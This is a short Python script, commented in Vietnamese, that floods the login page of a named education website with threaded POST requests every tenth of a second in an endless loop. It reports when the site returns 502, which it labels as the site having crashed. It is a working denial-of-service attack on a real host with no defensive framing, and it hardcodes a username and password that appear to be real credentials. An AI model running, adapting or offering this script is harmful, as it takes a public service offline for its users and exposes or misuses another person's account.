import requests
import time
import threading

url = "http://llt.thanhhoa.edu.vn:8089/accounts/login"
csrftoken = requests.get(url).cookies.get_dict()['csrftoken']

def dang_nhap(): # Chả hiểu sao đăng nhập nhiều lại chết web được, ảo vl
    try:
        body = {
            'csrfmiddlewaretoken': csrftoken,
            'username': "nguyendtk",
            'password': 'Khoi@280409',
        }
        response = requests.post(url, data=body)
        print(response.status_code)
        if response.status_code == 502:
            print("Web đã sập")
    except:
        pass

while True:
    threading.Thread(target=dang_nhap).start()
    time.sleep(0.1) # Cái web yếu xìu này thì không cần phải tốn công mất sức làm gì